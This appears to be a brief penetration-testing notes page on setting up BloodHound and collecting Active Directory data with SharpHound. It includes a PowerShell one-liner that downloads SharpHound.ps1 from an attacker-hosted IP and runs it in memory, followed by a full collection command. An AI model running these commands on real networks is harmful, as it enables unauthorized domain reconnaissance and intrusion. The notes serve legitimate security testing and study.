# BloodHound

### Install

{% embed url="https://bloodhound.readthedocs.io/en/latest/installation/linux.html" %}

Start neo4j

```
 /usr/bin/neo4j console
```

Start BloodHound

```
bloodhound &
```

Powershell

```
 iex(New-Object Net.Webclient).downloadstring("http://192.168.X.Y/SharpHound.ps1"); 
 
 Invoke-BloodHound -CollectionMethod All -OutputDirectory C:\windows\temp\
```
